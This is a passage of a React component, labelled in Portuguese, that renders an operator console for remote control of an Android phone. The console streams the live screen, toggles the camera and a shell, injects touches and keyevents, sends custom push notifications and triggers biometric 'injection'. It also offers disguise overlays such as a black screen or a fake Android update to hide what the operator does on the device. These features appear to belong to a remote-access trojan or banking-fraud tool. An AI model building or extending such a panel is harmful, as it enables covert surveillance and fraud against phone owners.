                setTelaActive(!telaActive);
                showToast(telaActive ? "Streaming de tela pausado" : "Streaming de tela retomado", "success");
              }}
              title="Streaming da Tela em Tempo Real"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">Tela</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${camActive ? "active" : ""}`}
              onClick={() => {
                setCamActive(!camActive);
                showToast(camActive ? "Câmera desativada" : "Câmera solicitada", "info");
              }}
              title="Câmera do Aparelho"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">Cam</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${shellActive ? "active" : ""}`}
              onClick={() => {
                setShellActive(!shellActive);
                showToast(shellActive ? "Barra de atalhos oculta" : "Barra de atalhos exibida", "info");
              }}
              title="Terminal e Atalhos Rápidos"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">Shell</span>
            </button>

            {/* Biometria Button */}
            <button
              type="button"
              className={`tactical-pill-toggle ${isBiometricActive ? "active" : ""}`}
              onClick={handleBiometricAuth}
              style={{
                borderColor: isBiometricActive ? "#a855f7" : "#1e293b",
                background: isBiometricActive ? "rgba(168, 85, 247, 0.25)" : "transparent",
                color: isBiometricActive ? "#c084fc" : "#cbd5e1"
              }}
              title="Injetar / Autenticar Biometria cadastrada no dispositivo"
            >
              <Fingerprint size={11} className={isBiometricActive ? "animate-spin" : ""} style={{ color: "#a855f7" }} />
              <span className="pill-label">Biometria</span>
            </button>

            {/* Telas no Celular (Disfarces: Tela Preta, Atualização, Bateria, Imagem) */}
            <button
              type="button"
              className="tactical-fit-chip"
              onClick={() => {
                setSidebarInitialTab("telas");
                setShowRightSidebar(true);
              }}
              style={{
                background: activeDisguise?.active ? "rgba(255, 26, 42, 0.2)" : "rgba(168, 85, 247, 0.14)",
                borderColor: activeDisguise?.active ? "#ff1a2a" : "#a855f7",
                color: activeDisguise?.active ? "#ff4d5a" : "#c084fc",
                fontWeight: activeDisguise?.active ? 800 : 700
              }}
              title="Abrir Telas no Celular (Tela Preta, Atualização Android, Bateria, Imagem)"
            >
              <Smartphone size={11} />
              <span>{activeDisguise?.active ? "Disfarce" : "Telas"}</span>
            </button>

            {/* Enviar Push Notification no Aparelho */}
            <button
              type="button"
              className="tactical-fit-chip"
              onClick={() => {
                setSidebarInitialTab("telas");
                setShowRightSidebar(true);
              }}
              style={{
                background: "rgba(245, 158, 11, 0.16)",
                borderColor: "#f59e0b",
                color: "#fbbf24",
                fontWeight: 700
              }}
              title="Enviar Push Notification personalizada no dispositivo"
            >
              <Bell size={11} />
              <span>Push</span>
            </button>
            {/* Controles de Tamanho & Zoom da Tela para Desktop (Auto-Fit & Níveis) */}
            <div
              className="tactical-zoom-controls-group"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "4px",
                background: "rgba(10, 14, 24, 0.9)",
                border: "1px solid rgba(56, 189, 248, 0.25)",
                borderRadius: "14px",
                padding: "2px 5px",
                boxShadow: "0 2px 8px rgba(0, 0, 0, 0.5)"
              }}
            >
              <button
                type="button"
                className={`tactical-zoom-chip ${isAutoFit ? "active" : ""}`}
                onClick={() => {
                  setIsAutoFit(true);
                  setViewScale(100);
                  showToast("Auto-Fit ativado: Telas proporcionais 9:16 ajustadas ao monitor!", "success");
                }}
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "3px",
                  padding: "2px 7px",
                  borderRadius: "10px",
                  fontSize: "9.5px",
                  fontWeight: 800,
                  cursor: "pointer",
                  border: isAutoFit ? "1px solid #38bdf8" : "1px solid transparent",
                  background: isAutoFit ? "rgba(56, 189, 248, 0.25)" : "transparent",
                  color: isAutoFit ? "#38bdf8" : "#94a3b8",
                  boxShadow: isAutoFit ? "0 0 8px rgba(56, 189, 248, 0.3)" : "none"
                }}
                title="Ajuste automático para o tamanho ideal do monitor sem distorcer as telas"
              >
                <Sparkles size={10} />
                <span>AUTO</span>
              </button>

              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  background: "rgba(15, 23, 42, 0.8)",
                  borderRadius: "8px",
                  padding: "1px 2px",
                  border: "1px solid rgba(255, 255, 255, 0.08)"
                }}
              >
                <button
                  type="button"
                  onClick={() => {
                    setIsAutoFit(false);
                    setViewScale((prev) => Math.max(50, prev - 10));
                  }}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: "#94a3b8",
                    padding: "0 5px",
                    cursor: "pointer",
                    fontSize: "12px",
                    fontWeight: 800,
                    lineHeight: 1
                  }}
                  title="Diminuir tamanho das telas (-10%)"
                >
                  -
                </button>
                <span
                  style={{
                    fontSize: "10px",
                    fontWeight: 700,
                    fontFamily: "var(--font-mono)",
                    color: isAutoFit ? "#38bdf8" : "#e2e8f0",
                    minWidth: "32px",
                    textAlign: "center",
                    cursor: "pointer",
                    userSelect: "none"
                  }}
                  onClick={() => setIsAutoFit(!isAutoFit)}
                  title="Clique para alternar Auto-Fit"
                >
                  {isAutoFit ? "AUTO" : `${viewScale}%`}
                </span>
                <button
                  type="button"
                  onClick={() => {
                    setIsAutoFit(false);
                    setViewScale((prev) => Math.min(150, prev + 10));
                  }}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: "#94a3b8",
                    padding: "0 5px",
                    cursor: "pointer",
                    fontSize: "12px",
                    fontWeight: 800,
                    lineHeight: 1
                  }}
                  title="Aumentar tamanho das telas (+10%)"
                >
                  +
                </button>
              </div>

              <div style={{ display: "inline-flex", alignItems: "center", gap: "2px" }}>
                {(
                  [
                    { label: "P", scale: 70, title: "Tamanho Pequeno (70%)" },
                    { label: "M", scale: 85, title: "Tamanho Médio (85%)" },
                    { label: "G", scale: 100, title: "Tamanho Padrão (100%)" },
                    { label: "Max", scale: 120, title: "Tamanho Máximo (120%)" }
                  ] as const
                ).map((preset) => {
                  const isCur = !isAutoFit && Math.abs(viewScale - preset.scale) <= 5;
                  return (
                    <button
                      key={preset.label}
                      type="button"
                      className={`tactical-zoom-preset-chip ${isCur ? "active" : ""}`}
                      onClick={() => {
                        setIsAutoFit(false);
                        setViewScale(preset.scale);
                      }}
                      style={{
                        padding: "1px 5px",
                        fontSize: "9px",
                        fontWeight: 700,
                        borderRadius: "6px",
                        border: isCur ? "1px solid #38bdf8" : "1px solid rgba(255, 255, 255, 0.06)",
                        background: isCur ? "rgba(56, 189, 248, 0.2)" : "transparent",
                        color: isCur ? "#38bdf8" : "#94a3b8",
                        cursor: "pointer"
                      }}
                      title={preset.title}
                    >
                      {preset.label}
                    </button>
                  );
                })}
              </div>
            </div>
          </div>

          {/* Ações Rápidas no Canto Direito */}
          <div className="tactical-actions-group">
            <button
              type="button"
              className={`quick-actions-toggle-pill ${showRightSidebar ? "active" : ""}`}
              title="Abrir / Fechar Painel de Funções Rápidas"
              onClick={() => setShowRightSidebar(!showRightSidebar)}
            >
              <Zap size={12} style={{ fill: showRightSidebar ? "#ff1a2a" : "none" }} />
              <span>AÇÕES</span>
            </button>

            <button
              type="button"
              className={`tactical-action-btn ${isLocked ? "active" : ""}`}
              title="Bloquear / Desbloquear Tela do Aparelho (Power)"
              onClick={handleToggleLock}
              style={{ color: isLocked ? "#ef4444" : "#f59e0b" }}
            >
              {isLocked ? <Lock size={13} /> : <Power size={13} />}
            </button>

            <button
              type="button"
              className={`tactical-action-btn ${isPinned ? "active" : ""}`}
              title="Fixar painel de visualização"
              onClick={handleTogglePin}
            >
              <Pin size={13} />
            </button>

            <button
              type="button"
              className="tactical-action-btn"
              title="Copiar dados do dispositivo"
              onClick={handleCopyInfo}
            >
              <Copy size={13} />
            </button>

            <button
              type="button"
              className="tactical-action-btn"
              title="Atualizar Tela Manualmente"
              onClick={() => {
                setScreenTimestamp(Date.now());
                refreshA11y();
                showToast("Tela e acessibilidade sincronizadas", "success");
              }}
            >
              <RotateCw size={13} />
            </button>

            <button
              type="button"
              className="tactical-action-btn"
              title="Tela Cheia (Fullscreen)"
              onClick={handleToggleFullscreen}
            >
              <Maximize2 size={13} />
            </button>
          </div>
        </div>
      </header>

      {/* 2. CORPO PRINCIPAL: VIEWPORTS CENTRAIS (1, 2 OU 3 TELAS) + FUNÇÕES RÁPIDAS */}
      <div className="tactical-screen-body-row">
        <div className="tactical-stage-and-footer-column">
          <div
            ref={stageRef}
            className={`tactical-viewports-stage screens-${activeScreensCount} ${isAutoFit ? "is-auto-fit" : ""}`}
            data-screens={activeScreensCount}
          >
            <div
              className="tactical-viewport-scale-wrapper"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                height: "100%",
                width: "100%",
                gap: activeScreensCount > 1 ? "16px" : "0"
              }}
            >
          {/* PAINEL ESQUERDO: Tela Real do Dispositivo com Toques Interativos */}
          {telaActive && (
            <div
              className="tactical-phone-viewport live-device-frame"
              style={{
                width: `${viewportDimensions.frameWidth}px`,
                height: `${viewportDimensions.frameHeight}px`,
                position: "relative",
                overflow: "hidden",
                display: "flex",
                flexDirection: "column",
                boxSizing: "border-box",
                flexShrink: 0
              }}
            >
              {/* Top Smartphone Status Bar & Notch */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "4px 14px",
                  background: "#080a10",
                  borderBottom: "1px solid rgba(255, 255, 255, 0.06)",
                  zIndex: 10,
                  fontSize: "11px",
                  color: "#cbd5e1",
                  fontFamily: "var(--font-mono)",
                  height: "28px",
                  minHeight: "28px",
                  boxSizing: "border-box",
                  flexShrink: 0
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                  {device.status === "offline" ? (
                    <span style={{ fontWeight: 700, color: "#ef4444", display: "inline-flex", alignItems: "center", gap: "4px" }}>
                      <span style={{ width: "5px", height: "5px", borderRadius: "50%", background: "#ef4444" }} />
                      OFFLINE
                    </span>
                  ) : (
                    <span style={{ fontWeight: 700, color: "#22c55e", display: "inline-flex", alignItems: "center", gap: "4px" }}>
                      <span style={{ width: "5px", height: "5px", borderRadius: "50%", background: "#22c55e" }} />
                      {fps} FPS
                    </span>
                  )}
                  {device.status !== "offline" && foregroundApp && (
                    <span style={{ color: "#94a3b8", display: "inline-flex", alignItems: "center", gap: "4px", fontSize: "10.5px" }}>
                      · <AppLogo name={foregroundApp.name} packageName={foregroundApp.packageName} size={13} />
                      <span style={{ maxWidth: "110px", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                        {foregroundApp.name}
                      </span>
                    </span>
                  )}
                </div>

                {/* Minimalist Phone Speaker / Camera Notch */}
                <div style={{ width: "36px", height: "4px", borderRadius: "2px", background: "#1e293b" }} />

                <div style={{ display: "flex", alignItems: "center", gap: "6px", fontSize: "10.5px" }}>
                  {device.status === "offline" ? (
                    <span style={{ color: "#ef4444", display: "inline-flex", alignItems: "center", gap: "4px", fontSize: "10px", fontWeight: 700 }}>
                      <WifiOff size={11} style={{ color: "#ef4444" }} /> Desconectado
                    </span>
                  ) : (
                    <>
                      {device.networkType === "4g" || device.networkType === "5g" || device.networkType === "3g" ? (
                        <span style={{ color: "#fbbf24", fontWeight: 800, fontSize: "9.5px", fontFamily: "var(--font-mono)" }}>4G</span>
                      ) : (
                        <Wifi size={11} style={{ color: "#38bdf8" }} />
                      )}
                      <span style={{ display: "inline-flex", alignItems: "center", gap: "3px" }}>
                        <span>{device.battery ?? 100}%</span>
                        <Battery size={11} style={{ color: "#22c55e" }} />
                      </span>
                    </>
                  )}
                </div>
              </div>

              {/* Real Screen Image Container */}
              <div
                ref={screenWrapperRef}
                className="real-screen-container"
                style={{
                  position: "relative",
                  width: `${viewportDimensions.screenWidth}px`,
                  height: `${viewportDimensions.screenHeight}px`,
                  aspectRatio: `${deviceAspectRatio}`,
                  background: "#000000",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  overflow: "hidden",
                  boxSizing: "border-box"
                }}
              >
                {/* Canvas de Transmissão em Tempo Real com Suporte a Deslize com Dedo / Mouse */}
                <canvas
                  ref={canvasRef}
                  width={720}
                  height={1280}
                  onPointerDown={handleLivePointerDown}
                  onPointerMove={handleLivePointerMove}
                  onPointerUp={handleLivePointerUp}
                  onPointerCancel={handleLivePointerUp}
                  style={{
                    width: "100%",
                    height: "100%",
                    objectFit: "contain",
                    cursor: touchActive ? (activeDrag?.active ? "grabbing" : "grab") : "default",
                    userSelect: "none",
                    WebkitUserSelect: "none",
                    display: "block",
                    imageRendering: "auto",
                    touchAction: "none"
                  }}
                />

                {/* Active Finger Touch Pointer & Gesture Trail (Live Viewport) */}
                {activeDrag?.active && (
                  <>
                    <div
                      style={{
                        position: "absolute",
                        left: `${activeDrag.pctCurrentX}%`,
                        top: `${activeDrag.pctCurrentY}%`,
                        width: "36px",
                        height: "36px",
                        borderRadius: "50%",
                        background: "radial-gradient(circle, rgba(56, 189, 248, 0.8) 0%, rgba(56, 189, 248, 0.25) 60%, transparent 75%)",
                        border: "2px solid #38bdf8",
                        transform: "translate(-50%, -50%)",
                        pointerEvents: "none",
                        zIndex: 100,
                        boxShadow: "0 0 16px rgba(56, 189, 248, 0.6)"
                      }}
                    >
                      <div
                        style={{
                          position: "absolute",
                          left: "50%",
                          top: "50%",
                          width: "8px",
                          height: "8px",
                          borderRadius: "50%",
                          background: "#ffffff",
                          transform: "translate(-50%, -50%)",
                          boxShadow: "0 0 8px #ffffff"
                        }}
                      />
                    </div>

                    {Math.hypot(activeDrag.currentX - activeDrag.startX, activeDrag.currentY - activeDrag.startY) > 10 && (
                      <svg
                        style={{
                          position: "absolute",
                          inset: 0,
                          width: "100%",
                          height: "100%",
                          pointerEvents: "none",
                          zIndex: 99
                        }}
                      >
                        <line
                          x1={`${activeDrag.pctStartX}%`}
                          y1={`${activeDrag.pctStartY}%`}
                          x2={`${activeDrag.pctCurrentX}%`}
                          y2={`${activeDrag.pctCurrentY}%`}
                          stroke="#38bdf8"
                          strokeWidth="3"
                          strokeDasharray="4 3"
                          strokeLinecap="round"
                          filter="drop-shadow(0 0 6px #38bdf8)"
                        />
                        <circle
                          cx={`${activeDrag.pctStartX}%`}
                          cy={`${activeDrag.pctStartY}%`}
                          r="5"
                          fill="#22c55e"
                          stroke="#ffffff"
                          strokeWidth="1.5"
                        />
                      </svg>
                    )}
                  </>
                )}
                <img
                  ref={imgRef}
                  src={activeFrameSrc}
                  alt=""
                  style={{ display: "none" }}
                  aria-hidden="true"
                />

                {/* Device Disguise Overlay (Tela Preta, Atualizando Android, Bateria, Imagem) */}
                {activeDisguise?.active && (
                  <DeviceDisguiseOverlay
                    disguise={activeDisguise}
                    batteryLevel={device.battery}
                    onDismiss={handleClearDisguise}
                    showDismissButton={true}
                  />
                )}

                {/* Animated Heads-Up Push Notification Banner (Notificação Push Dinâmica) */}
                {activePushBanner && (
                  <div
                    style={{
                      position: "absolute",
                      top: "8px",
                      left: "8px",
                      right: "8px",
                      background: "rgba(11, 15, 25, 0.96)",
                      border: "1px solid rgba(245, 158, 11, 0.6)",
                      borderRadius: "12px",
                      boxShadow: "0 12px 28px rgba(0, 0, 0, 0.85), 0 0 16px rgba(245, 158, 11, 0.25)",
                      backdropFilter: "blur(14px)",
                      padding: "9px 11px",
                      zIndex: 105,
                      display: "flex",
                      alignItems: "flex-start",
                      gap: "9px",
                      cursor: "pointer"
                    }}
                    onClick={() => setActivePushBanner(null)}
                    title="Notificação Push Ativa no Celular (Toque para fechar)"
                  >
                    <div style={{ flexShrink: 0, marginTop: "2px" }}>
                      <AppLogo name={activePushBanner.appName} packageName={activePushBanner.packageName} size={26} />
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "1px" }}>
                        <span style={{ fontSize: "9px", fontWeight: 800, color: "#fbbf24", textTransform: "uppercase", letterSpacing: "0.4px" }}>
                          {activePushBanner.appName} • agora
                        </span>
                        <button
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            setActivePushBanner(null);
                          }}
                          style={{
                            background: "transparent",
                            border: "none",
                            color: "#94a3b8",
                            cursor: "pointer",
                            padding: "0 2px",
                            fontSize: "10px"
                          }}
                          title="Fechar banner"
                        >
                          ✕
                        </button>
                      </div>
                      <div style={{ fontSize: "11px", fontWeight: 700, color: "#ffffff", marginBottom: "2px", lineHeight: 1.25 }}>
                        {activePushBanner.title}
                      </div>
                      <div style={{ fontSize: "10px", color: "#cbd5e1", lineHeight: 1.35, wordBreak: "break-word" }}>
                        {activePushBanner.message}
                      </div>
                    </div>
                  </div>
                )}

                {/* Synced Touch Feedback Ripples (Simultâneo em Tempo Real) */}
                {syncedRipples.map((r) => (
                  <span
                    key={r.id}
                    style={{
                      position: "absolute",
                      left: `${r.pctX}%`,
                      top: `${r.pctY}%`,
                      width: "38px",
                      height: "38px",
                      borderRadius: "50%",
                      backgroundColor: r.source === "skeleton" ? "rgba(56, 189, 248, 0.45)" : "rgba(34, 197, 94, 0.45)",
                      border: `2px solid ${r.source === "skeleton" ? "#38bdf8" : "#22c55e"}`,
                      transform: "translate(-50%, -50%)",
                      pointerEvents: "none",
                      boxShadow: `0 0 16px ${r.source === "skeleton" ? "#38bdf8" : "#22c55e"}`,
                      zIndex: 99
                    }}
                  />
                ))}

                {/* Tactical Digital Touch HUD Banner */}
                {touchActive && showTouchHUD && activeTouchFeedback && (
                  <div
                    style={{
                      position: "absolute",
                      top: "10px",
                      left: "50%",
                      transform: "translateX(-50%)",
                      background: "rgba(6, 7, 10, 0.9)",
                      border: "1px solid rgba(34, 197, 94, 0.45)",
                      borderRadius: "20px",
                      padding: "4px 12px",
                      display: "flex",
                      alignItems: "center",
                      gap: "6px",
                      fontSize: "11px",
                      color: "#cbd5e1",
                      backdropFilter: "blur(6px)",
                      zIndex: 10,
                      boxShadow: "0 4px 14px rgba(0,0,0,0.6)",
                      pointerEvents: "none"
                    }}
                  >
                    <span
                      style={{
                        width: "6px",
                        height: "6px",
                        borderRadius: "50%",
                        background: activeTouchFeedback.source === "remote_simulation" ? "#38bdf8" : "#22c55e",
                        boxShadow: `0 0 6px ${activeTouchFeedback.source === "remote_simulation" ? "#38bdf8" : "#22c55e"}`
                      }}
                    />
                    <span style={{ fontWeight: 800, color: activeTouchFeedback.source === "remote_simulation" ? "#38bdf8" : "#22c55e" }}>
                      {activeTouchFeedback.source === "remote_simulation" ? "TOQUE SIMULADO" : "TOQUE DETECTADO"}
                    </span>
                    <span style={{ color: "#94a3b8" }}>
                      ({Math.round(activeTouchFeedback.x)}, {Math.round(activeTouchFeedback.y)})
                      {activeTouchFeedback.viewText ? ` • "${activeTouchFeedback.viewText}"` : ""}
                    </span>
                  </div>
                )}

                {/* Tactical Device Offline Overlay */}
                {device.status === "offline" && (
                  <div
                    style={{
                      position: "absolute",
                      inset: 0,
                      background: "radial-gradient(circle at center, rgba(15, 23, 42, 0.97) 0%, rgba(6, 7, 10, 0.99) 100%)",
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      padding: "20px",
                      textAlign: "center",
                      zIndex: 85,
                      backdropFilter: "blur(8px)"
                    }}
                  >
                    <div
                      style={{
                        width: "60px",
                        height: "60px",
                        borderRadius: "50%",
                        background: "rgba(239, 68, 68, 0.12)",
                        border: "2px solid rgba(239, 68, 68, 0.35)",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        marginBottom: "14px",
                        boxShadow: "0 0 20px rgba(239, 68, 68, 0.25)"
                      }}
                    >
                      <WifiOff size={28} style={{ color: "#ef4444" }} />
                    </div>

                    <div
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: "6px",
                        background: "rgba(239, 68, 68, 0.15)",
                        border: "1px solid rgba(239, 68, 68, 0.4)",
                        padding: "3px 10px",
                        borderRadius: "20px",
                        marginBottom: "10px"
                      }}
                    >
                      <span style={{ width: "6px", height: "6px", borderRadius: "50%", background: "#ef4444" }} />
                      <span style={{ fontSize: "10.5px", fontWeight: 800, color: "#f87171", letterSpacing: "0.8px" }}>
                        APARELHO OFFLINE
                      </span>
                    </div>

                    <h4 style={{ fontSize: "14px", fontWeight: 800, color: "#f8fafc", margin: "0 0 6px 0" }}>
                      {device.name || "Aparelho Desconectado"}
                    </h4>

                    <p style={{ fontSize: "11.5px", color: "#94a3b8", lineHeight: 1.5, margin: "0 0 16px 0", maxWidth: "250px" }}>
                      O dispositivo não está transmitindo ou o agente foi pausado. A transmissão retornará assim que o aparelho conectar.
                    </p>

                    <div
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "6px",
                        background: "rgba(15, 23, 42, 0.7)",
                        border: "1px solid rgba(255, 255, 255, 0.08)",
                        borderRadius: "8px",
                        padding: "10px 14px",
                        width: "100%",
                        maxWidth: "250px",
                        fontSize: "11px",
                        color: "#cbd5e1",
                        textAlign: "left",
                        marginBottom: "16px"
                      }}
                    >
                      <div style={{ display: "flex", justifyContent: "space-between" }}>
                        <span style={{ color: "#64748b" }}>Status Real:</span>
                        <span style={{ color: "#ef4444", fontWeight: 700 }}>● Desconectado</span>
                      </div>
                      <div style={{ display: "flex", justifyContent: "space-between" }}>
                        <span style={{ color: "#64748b" }}>Identificador:</span>
                        <span style={{ fontFamily: "var(--font-mono)", color: "#94a3b8" }}>{device.id.slice(0, 16)}</span>
                      </div>
                      <div style={{ display: "flex", justifyContent: "space-between" }}>
                        <span style={{ color: "#64748b" }}>Streaming:</span>
                        <span style={{ color: "#f59e0b", fontWeight: 600 }}>Pausado (0 FPS)</span>
                      </div>
                    </div>

                    <button
                      type="button"
                      className="primary compact-btn"
                      onClick={() => {
                        triggerImmediateFrame();
                        refreshA11y();
                      }}
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: "6px",
                        padding: "7px 14px",
                        fontSize: "11.5px",
                        fontWeight: 700,
                        borderRadius: "8px",
                        background: "linear-gradient(135deg, rgba(239, 68, 68, 0.25) 0%, rgba(220, 38, 38, 0.35) 100%)",
                        border: "1px solid rgba(239, 68, 68, 0.5)",
                        color: "#fca5a5",
                        cursor: "pointer"
                      }}
                    >
                      <RotateCw size={12} />
                      <span>Verificar Conexão</span>
                    </button>
                  </div>
                )}

                {/* Stream Disconnect Overlay */}
                {!isStreaming && Date.now() - lastFrameSuccessTimeRef.current > 4000 && (
                  <div
                    style={{
                      position: "absolute",
                      inset: 0,
                      background: "rgba(9, 10, 15, 0.85)",
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: "12px",
                      padding: "20px",
                      textAlign: "center"
                    }}
                  >
                    <Smartphone size={36} style={{ color: "#f59e0b" }} />
                    <span style={{ fontSize: "13px", fontWeight: 700, color: "#f8fafc" }}>
                      Aguardando Próximo Quadro...
                    </span>
                    <button
                      type="button"
                      className="primary compact-btn"
                      onClick={() => setScreenTimestamp(Date.now())}
                      style={{ fontSize: "11px" }}
                    >
                      Reconectar Frame
                    </button>
                  </div>
                )}
              </div>

              {/* BARRA DE NAVEGAÇÃO ANDROID VIRTUAL NATIVA (RECENTES, INICIAR, VOLTAR) */}
              <div className="android-hardware-navbar">
                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 187", "Trocar Telas / Recentes")}
                  title="Trocar de Telas / Aplicativos Recentes (KEYCODE_APP_SWITCH 187)"
                >
                  <span className="nav-btn-icon">|||</span>
                  <span className="nav-btn-text">RECENTES</span>
                </button>

                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 3", "Iniciar / Home")}
                  title="Tela Inicial / Iniciar (KEYCODE_HOME 3)"
                >
                  <span className="nav-btn-icon">○</span>
                  <span className="nav-btn-text">INICIAR</span>
                </button>

                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 4", "Voltar")}
                  title="Voltar Tela Anterior (KEYCODE_BACK 4)"
                >
                  <span className="nav-btn-icon">◁</span>
                  <span className="nav-btn-text">VOLTAR</span>
                </button>
              </div>
            </div>
          )}

          {/* PAINEL DIREITO: SCREEN READER (TELA ESQUELETO 2D WIREFRAME REAL DO DISPOSITIVO) */}
          {srActive && (
            <div
              className="tactical-phone-viewport screen-reader-frame"
              style={{
                width: `${viewportDimensions.frameWidth}px`,
                height: `${viewportDimensions.frameHeight}px`,
                position: "relative",
                borderRadius: "24px",
                border: "2px solid #232d44",
                boxShadow: "0 12px 36px rgba(0, 0, 0, 0.7)",
                overflow: "hidden",
                display: "flex",
                flexDirection: "column",
                boxSizing: "border-box",
                flexShrink: 0
              }}
            >
              {/* Top Smartphone Status Bar & Notch - Idêntico ao Original */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "4px 12px",
                  background: "#080a10",
                  borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
                  zIndex: 20,
                  fontSize: "11px",
                  color: "#cbd5e1",
                  fontFamily: "var(--font-mono)",
                  height: "28px",
                  minHeight: "28px",
                  flexShrink: 0
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
                  <AppLogo name={resolvedActiveApp.name} packageName={resolvedActiveApp.packageName} size={15} />
                  <span
                    style={{
                      fontWeight: 800,
                      color: "#38bdf8",
                      fontSize: "11px",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                      maxWidth: "130px"
                    }}
                    title={`${resolvedActiveApp.name} (${resolvedActiveApp.packageName})`}
                  >
                    {resolvedActiveApp.name}
                  </span>
                  {device.status === "offline" ? (
                    <span
                      style={{
                        fontSize: "8px",
                        fontWeight: 700,
                        color: "#ef4444",
                        background: "rgba(239, 68, 68, 0.15)",
                        border: "1px solid rgba(239, 68, 68, 0.3)",
                        padding: "1px 4px",
                        borderRadius: "3px"
                      }}
                    >
                      OFFLINE
                    </span>
                  ) : (
                    <span
                      style={{
                        fontSize: "8px",
                        fontWeight: 700,
                        color: "#22c55e",
                        background: "rgba(34, 197, 94, 0.15)",
                        border: "1px solid rgba(34, 197, 94, 0.3)",
                        padding: "1px 4px",
                        borderRadius: "3px"
                      }}
                    >
                      2D
                    </span>
                  )}
                </div>

                {/* Minimalist Phone Speaker Notch */}
                <div style={{ width: "32px", height: "4px", borderRadius: "2px", background: "#1e293b", flexShrink: 0 }} />

                <div style={{ display: "flex", alignItems: "center", gap: "5px", fontSize: "10px", flexShrink: 0 }}>
                  <div style={{ display: "flex", gap: "1px", background: "#0a0d14", padding: "1px", borderRadius: "3px", border: "1px solid #1c2438" }}>
                    <button
                      type="button"
                      onClick={() => setSkeletonViewMode("visual")}
                      style={{
                        padding: "1px 5px",
                        fontSize: "8.5px",
                        fontWeight: 700,
                        borderRadius: "2px",
                        background: skeletonViewMode === "visual" ? "#38bdf8" : "transparent",
                        color: skeletonViewMode === "visual" ? "#000" : "#94a3b8",
                        border: "none",
                        cursor: "pointer"
                      }}
                      title="Visualização 2D idêntica à interface real"
                    >
                      2D
                    </button>
                    <button
                      type="button"
                      onClick={() => setSkeletonViewMode("list")}
                      style={{
                        padding: "1px 5px",
                        fontSize: "8.5px",
                        fontWeight: 700,
                        borderRadius: "2px",
                        background: skeletonViewMode === "list" ? "#38bdf8" : "transparent",
                        color: skeletonViewMode === "list" ? "#000" : "#94a3b8",
                        border: "none",
                        cursor: "pointer"
                      }}
                      title="Lista de nós"
                    >
                      Lista
                    </button>
                  </div>
                  <button
                    type="button"
                    onClick={refreshA11y}
                    style={{
                      background: "rgba(15, 23, 42, 0.8)",
                      border: "1px solid #1e293b",
                      borderRadius: "3px",
                      padding: "2px 4px",
                      color: "#94a3b8",
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center"
                    }}
                    title="Recarregar tela esqueleto"
                  >
                    <RotateCw size={10} className={isLoadingA11y ? "animate-spin" : ""} />
                  </button>
                  <Wifi size={10} style={{ color: device.status === "offline" ? "#ef4444" : "#38bdf8" }} />
                  <span style={{ display: "inline-flex", alignItems: "center", gap: "2px" }}>
                    <span>{device.status === "offline" ? "0" : device.battery ?? 100}%</span>
                    <Battery size={10} style={{ color: device.status === "offline" ? "#ef4444" : "#22c55e" }} />
                  </span>
                </div>
              </div>

              {/* Wireframe Viewport - 2D Visual Skeleton or DOM List */}
              {skeletonViewMode === "visual" ? (
                <div
                  ref={skeletonViewportRef}
                  className="sr-wireframe-viewport visual-mode"
                  onPointerDown={handleSkeletonPointerDown}
                  onPointerMove={handleSkeletonPointerMove}
                  onPointerUp={handleSkeletonPointerUp}
                  onPointerCancel={handleSkeletonPointerUp}
                  style={{
                    position: "relative",
                    width: `${viewportDimensions.screenWidth}px`,
                    height: `${viewportDimensions.screenHeight}px`,
                    aspectRatio: `${deviceAspectRatio}`,
                    background: "#080a12",
                    backgroundImage: "linear-gradient(rgba(56, 189, 248, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(56, 189, 248, 0.05) 1px, transparent 1px)",
                    backgroundSize: "22px 22px",
                    overflow: "hidden",
                    border: "none",
                    padding: 0,
                    cursor: touchActive ? (activeDrag?.active ? "grabbing" : "grab") : "default",
                    touchAction: "none",
                    boxSizing: "border-box"
                  }}
                >
                  {/* Offline Skeleton Overlay */}
                  {device.status === "offline" && (
                    <div
                      style={{
                        position: "absolute",
                        inset: 0,
                        background: "radial-gradient(circle at center, rgba(15, 23, 42, 0.95) 0%, rgba(6, 7, 10, 0.98) 100%)",
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        justifyContent: "center",
                        padding: "20px",
                        textAlign: "center",
                        zIndex: 65,
                        backdropFilter: "blur(6px)"
                      }}
                    >
                      <div
                        style={{
                          width: "48px",
                          height: "48px",
                          borderRadius: "50%",
                          background: "rgba(239, 68, 68, 0.12)",
                          border: "1px solid rgba(239, 68, 68, 0.35)",
